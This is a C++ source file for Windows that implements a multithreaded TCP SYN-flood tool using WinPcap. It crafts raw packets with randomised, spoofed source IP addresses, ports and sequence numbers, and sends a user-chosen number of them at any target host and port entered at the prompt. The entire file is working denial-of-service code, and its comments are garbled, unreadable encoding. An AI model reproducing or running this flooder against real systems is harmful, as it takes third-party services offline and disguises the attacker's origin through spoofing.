#include <iostream>
#include <iphlpapi.h>
#include <pcap.h>
#include <string.h>

typedef unsigned char byte;   //һ���ֽ�
typedef unsigned short byte2; //�����ֽ�
typedef unsigned int byte4;   //�ĸ��ֽ�

//�̲߳����ṹ��
struct PACKET_PARAM
{
    pcap_t *iface;     //����
    byte *packet;      //���ݰ�
    byte *fake_packet; //����У����õ�α��
    byte4 r;           //�����
    int count;         //��������

} packet_param;

//��̫��֡��ͷ 14���ֽ�
struct ETH_HEADER
{
    byte mac_dst[6]; //Ŀ����̫����ַ
    byte mac_src[6]; //Դ��̫����ַ
    byte2 eth_type;  //��̫������
};

//IP��ͷ 20���ֽ�
struct IP_HEADER
{
    byte header_len : 4, ip_ver : 4;                //�汾+IP���ĳ���
    byte tos;                                       //��������(Type of service)
    byte2 total_len;                                //��ȥeth���ֵ��ܳ�(Total length)
    byte2 identification;                           //��ʶ(Identification)
    byte2 of1 : 5, mf : 1, df : 1, rb : 1, of2 : 8; //��־λ(Flags) (3 bits) + ��ƫ����(Fragment offset) (13 bits)
    byte ttl;                                       //���ʱ��(Time to live)
    byte proto;                                     //Э��(Protocol)
    byte2 ip_crc;                                   //�ײ�У���(Header checksum)
    byte4 ip_src;                                   //Դ��ַ(Source address)
    byte4 ip_dst;                                   //Ŀ�ĵ�ַ(Destination address)
};

//TCP��ͷ 20���ֽ�
struct TCP_HEADER
{
    byte2 port_src;        //Դ�˿�
    byte2 port_dst;        //Ŀ�Ķ˿�
    byte4 sequence;        //���к�
    byte4 acknowledgement; //ȷ�Ϻ�
    //tcpͷ������+��־λ
    byte2 nonce : 1, reserved : 3, header_len : 4,
        fin : 1, syn : 1, reset : 1, push : 1, ack : 1, urgent : 1, ecn_echo : 1, cwr : 1;
    byte2 windows_size;   //���ڴ�С
    byte2 tcp_crc;        //У���
    byte2 urgent_pointer; //����ָ��
};

//αIP��ͷ 12���ֽ�
struct FAKE_HEADER
{
    byte4 ip_src;     //Դ��ַ(Source address)
    byte4 ip_dst;     //Ŀ�ĵ�ַ(Destination address)
    byte padding;     //���
    byte proto;       //Э��(Protocol)
    byte2 header_len; //IP���ĳ���
};

//У��ͼ���
byte2 CheckSum(byte2 packet[], int size)
{
    byte4 cksum = 0;
    while (size > 1)
    {
        cksum += *packet++;
        size -= sizeof(byte2);
    }
    if (size)
        cksum += *(byte *)packet;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (byte2)(~cksum);
}

//ͨ������IP����ȡARP��ƥ��������MAC
int GetGatewayMac(ETH_HEADER *eth_h, char *gatewayip)
{
    unsigned long table_size = 0; //arp��Ϣ�ṹ���С
    PMIB_IPNETTABLE arp_table = NULL;
    //��ȡarp�ṹ���С
    unsigned long res = GetIpNetTable(arp_table, &table_size, FALSE);
    if (res == ERROR_INSUFFICIENT_BUFFER)
    {
        //�����ڴ�ռ䲢��ȡarp��Ϣ
        arp_table = (PMIB_IPNETTABLE)malloc(table_size);
        if (NO_ERROR == GetIpNetTable(arp_table, &table_size, FALSE))
        {
            //���ж�ȡarp��Ϣ
            PMIB_IPNETROW cur_arp_log = arp_table->table;
            IN_ADDR gatewayaddr;
            for (int k = 0; k < arp_table->dwNumEntries; ++k)
            {
                //ƥ������IP��ַ, ����Ŀ��MACΪ����MAC
                gatewayaddr.S_un.S_addr = cur_arp_log[k].dwAddr;
                if (lstrcmp(inet_ntoa(gatewayaddr), gatewayip) == 0)
                    for (int j = 0; j < cur_arp_log[k].dwPhysAddrLen; j++)
                        memcpy(&eth_h->mac_dst[j], &cur_arp_log[k].bPhysAddr[j], 1);
                else
                    continue;
            }
        }
    }
    else
        return -1;
    delete arp_table;
    return 0;
}

//��ȡ���������豸��Ϣ��ѡ�񷢰���������ȡ����MAC��ַ
void ChooseIface(ETH_HEADER *eth_h)
{
    char iface_name[100] = {0};                        //��������
    char errbuf[PCAP_ERRBUF_SIZE];                     //���󻺳�
    PIP_ADAPTER_INFO alldevs = new IP_ADAPTER_INFO();  //������Ϣ�б�ͷ
    PIP_ADAPTER_INFO dev;                              //��ǰ������Ϣ
    unsigned long list_size = sizeof(IP_ADAPTER_INFO); //��ȡ�����ṹ���С
    int res = GetAdaptersInfo(alldevs, &list_size);    //��ȡ������Ϣ
    int i = 0, j = 0;                                  //������
    if (ERROR_BUFFER_OVERFLOW == res)
    {
        //�ռ䲻��,ɾ��֮ǰ������ڴ�,���·���
        delete alldevs;
        alldevs = (PIP_ADAPTER_INFO) new BYTE[list_size];
        res = GetAdaptersInfo(alldevs, &list_size);
    }
    if (ERROR_SUCCESS == res)
    {
        //���������������Ϣ����ѡ��
        dev = alldevs;
        while (dev)
        {
            printf("No.%d ", ++i);
            printf("%s\n", dev->Description);
            dev = dev->Next;
        }
    }
    else
    {
        printf("��ȡ������Ϣʧ��\n");
        if (alldevs)
            delete alldevs;
        system("PAUSE");
        exit(-1);
    }
    do
    {
        printf("ѡ������,����������� (1-%d): ", i);
        scanf("%d", &j);
        getchar();
    } while (j < 1 || j > i);
    //ѭ������ѡ����
    for (dev = alldevs, i = 0; i < j - 1; dev = dev->Next, i++)
        ;
    //������,����(������,Ҫ����Ĳ���,����ģʽ,����ʱʱ��,���󻺳�)
    sprintf(iface_name, "\\Device\\NPF_%s", dev->AdapterName);
    if ((packet_param.iface = pcap_open_live(iface_name, 65535, 1, 1000, errbuf)) == NULL)
    {
        fprintf(stderr, "\n�޷��򿪸�����������. WinPcap��֧�� \n");
        system("PAUSE");
        exit(-1);
    }
    //����ԴMAC��ַΪ��ѡ����MAC
    for (i = 0; i < dev->AddressLength; i++)
        memcpy(&eth_h->mac_src[i], &dev->Address[i], 1);
    //ͨ������IP��ѯ����MAC��ַ
    if (GetGatewayMac(eth_h, dev->GatewayList.IpAddress.String) == -1)
    {
        printf("��ȡ����MACʧ��");
        delete alldevs;
        system("PAUSE");
        exit(-1);
    }
    delete alldevs;
    return;
}

//���빥��Ŀ���IP�Ͷ˿�
void InputDst(IP_HEADER *ip_h, TCP_HEADER *tcp_h, FAKE_HEADER *fake_h)
{
    char dst[20];
    int i = 0, j = 0;
    printf("������Ŀ��IP������: ");
    gets(dst);
    byte4 ip = inet_addr(dst);
    //�ж��������IP��������
    if (ip == INADDR_NONE)
    {
        struct hostent *host;
        host = gethostbyname(dst);
        if (!host)
        {
            puts("��ȡIP��ַʧ��!");
            system("PAUSE");
            exit(-1);
        }
        //�жϸ������Ƿ�ӵ�ж��IP
        if (host->h_addr_list[1])
        {
            for (i = 0; host->h_addr_list[i]; i++)
                printf("%d: %s\n", i + 1, inet_ntoa(*(IN_ADDR *)host->h_addr_list[i]));
            do
            {
                printf("�������ж��IP��ַ,����Ŀ��IP��� (1-%d): ", i);
                scanf("%d", &j);
            } while (j < 1 || j > i);
            ip = *(byte4 *)host->h_addr_list[--i];
        }
        else
            ip = *(byte4 *)host->h_addr_list[0];
    }
    //����Ŀ��IP
    ip_h->ip_dst = ip;
    fake_h->ip_dst = ip;
    //����Ŀ��˿�
    u_short dst_port;
    printf("������Ŀ��˿�: ");
    scanf("%u", &dst_port);
    tcp_h->port_dst = htons(dst_port);
    return;
}

//�������ݰ�
void CraftPacket(ETH_HEADER *eth_h, IP_HEADER *ip_h, TCP_HEADER *tcp_h, FAKE_HEADER *fake_h)
{
    //eth��
    // eth_h->mac_dst;
    // eth_h->mac_src;
    eth_h->eth_type = htons(0x0800); //����

    //ip��
    ip_h->ip_ver = 4;                         //�汾
    ip_h->header_len = sizeof(IP_HEADER) / 4; //IPͷ������
    // ip_h->tos = 0;
    ip_h->total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER)); //IP+TCPͷ������
    // ip_h->identification = 0;
    // ip_h->rb = 0;
    ip_h->df = 1; //����Ƭ
    // ip_h->mf = 0;
    // ip_h->of1 = 0;
    // ip_h->of2 = 0;
    ip_h->ttl = 0xff; //TTL
    ip_h->proto = 6;  //Э��TCP
    // ip_h->ip_crc = 0;
    // ip_h->ip_src;
    // ip_h->ip_dst;

    //tcp��
    // tcp_h->port_src = 0;
    // tcp_h->port_src;
    // tcp_h->sequence = 0;
    // tcp_h->acknowledgement = 0;
    tcp_h->header_len = 20 / 4; //TCPͷ������
    // tcp_h->reserved = 0;
    // tcp_h->nonce = 0;
    // tcp_h->cwr = 0;
    // tcp_h->ecn_echo = 0;
    // tcp_h->urgent = 0
    // tcp_h->ack = 0;
    // tcp_h->push = 0;
    // tcp_h->reset = 0;
    tcp_h->syn = 1; //SYN�����
    // tcp_h->fin = 0;
    tcp_h->windows_size = htons(0xffff); //���ڴ�С
    // tcp_h->tcp_crc = 0;
    // tcp_h->urgent_pointer = 0;

    //αip��ͷ
    // fake_h->ip_src;
    // fake_h->ip_dst;
    // fake_h->padding = 0;
    fake_h->proto = 6;                              //Э��(Protocol)
    fake_h->header_len = htons(sizeof(TCP_HEADER)); //IP���ĳ���
    return;
}

//�����߳�
DWORD WINAPI AttackThread(LPVOID Param)
{
    byte packet[54] = {0};                             //���ݰ�
    byte fake_packet[32] = {0};                        //α��
    memcpy(packet, packet_param.packet, 54);           //�����ݰ���Ϣ�������̱߳���
    memcpy(fake_packet, packet_param.fake_packet, 32); //��α����Ϣ�������̱߳���
    int count = packet_param.count;                    //��������
    packet_param.r += 1;                               //�����
    byte4 seed = rand() * packet_param.r;              //�����
    char baseip[20];
    sprintf(baseip, "192.%u.0.0", (byte4)seed % 0xf); //�����IP
    byte4 ip_s = ntohl(inet_addr(baseip));            //����ʽ
    byte4 seq;                                        //���
    byte2 port_s;                                     //Դ�˿�

    IP_HEADER *ip_h = (IP_HEADER *)(packet + sizeof(ETH_HEADER));                        //IPͷ��
    TCP_HEADER *tcp_h = (TCP_HEADER *)(packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER)); //TCPͷ��
    FAKE_HEADER *fake_h = (FAKE_HEADER *)fake_packet;                                    //αIPͷ��
    TCP_HEADER *fake_tcp_h = (TCP_HEADER *)(fake_packet + sizeof(FAKE_HEADER));          //TCPαͷ��
    while (count > 0)
    {
        //���ԴIP��ַ
        ip_s += ((seed * count) % 0xffff) + 1;
        (*ip_h).ip_src = htonl(ip_s);
        fake_h->ip_src = htonl(ip_s);
        //���Դ�˿�
        port_s = ((seed * count) % 0xff) + 1024;
        tcp_h->port_src = htons(port_s);
        fake_tcp_h->port_src = htons(port_s);
        //������к�
        seq = (seed * count) % 0xffffff;
        tcp_h->sequence = htonl(seq);
        fake_tcp_h->sequence = htonl(seq);
        //����У���
        ip_h->ip_crc = 0;
        tcp_h->tcp_crc = 0;
        //��У���
        ip_h->ip_crc = CheckSum((byte2 *)ip_h, sizeof(IP_HEADER));
        tcp_h->tcp_crc = CheckSum((byte2 *)fake_packet, sizeof(FAKE_HEADER) + sizeof(TCP_HEADER));
        //����
        if (pcap_sendpacket(packet_param.iface, packet, sizeof(packet)) != 0)
        {
            fprintf(stderr, "\n����ʧ��: \n", pcap_geterr(packet_param.iface));
            system("PAUSE");
            exit(-1);
        }
        count -= 1;
    }
    return 0;
}

//���ù����߳����ʹ��������������߳�
void ReadyAttack(byte4 *dst_ip, byte2 *dst_port)
{
    int i, tc; //������
    printf("���빥���߳���: ");
    scanf("%d", &tc);
    printf("����ÿ�̹߳�������: ");
    scanf("%d", &packet_param.count);
    printf("��ʼ����......\n");
    HANDLE Threads[tc]; //�����߳�
    for (i = 0; i < tc; i++)
        Threads[i] = CreateThread(NULL, 0, AttackThread, NULL, 0, NULL);
    WaitForMultipleObjects(tc, Threads, TRUE, INFINITE);
    //��ִ����Ϻ�ر��߳�
    for (i = 0; i < tc; i++)
        CloseHandle(Threads[i]);
    //���������Ϣ
    printf("����Ŀ�� -> %s:%u\n�����߳���->%u\nÿ���̹߳�������->%d\n",
           inet_ntoa(*(IN_ADDR *)dst_ip), ntohs(*dst_port), tc, packet_param.count);
    printf("�������!\n");
}

int main(int argc, char **argv)
{
    system("mode con cols=110 lines=20");   //���ô��ڴ�С
    byte packet[54] = {0};                  //���ݰ�
    byte fake_packet[32] = {0};             //����У����õ�α��
    packet_param.packet = packet;           //�����ݰ��ĵ�ַ�����̲߳����ṹ��
    packet_param.fake_packet = fake_packet; //��α���ĵ�ַ�����̲߳����ṹ��

    ETH_HEADER *eth_h = (ETH_HEADER *)packet;                                            //��̫��ͷ��
    IP_HEADER *ip_h = (IP_HEADER *)(packet + sizeof(ETH_HEADER));                        //IPͷ��
    TCP_HEADER *tcp_h = (TCP_HEADER *)(packet + sizeof(ETH_HEADER) + sizeof(IP_HEADER)); //TCPͷ��
    FAKE_HEADER *fake_h = (FAKE_HEADER *)fake_packet;                                    //αIPͷ��

    CraftPacket(eth_h, ip_h, tcp_h, fake_h);                              //�������ݰ�
    ChooseIface(eth_h);                                                   //ѡ������,����ԴMAC��Ŀ��MAC
    InputDst(ip_h, tcp_h, fake_h);                                        //����Ŀ��IP�Ͷ˿�
    memcpy(fake_packet + sizeof(FAKE_HEADER), tcp_h, sizeof(TCP_HEADER)); //��TCPͷ�����ݸ��Ƶ�α����TCPαͷ��
    ReadyAttack(&ip_h->ip_dst, &tcp_h->port_dst);                         //���������߳�
    system("PAUSE");
    return 0;
}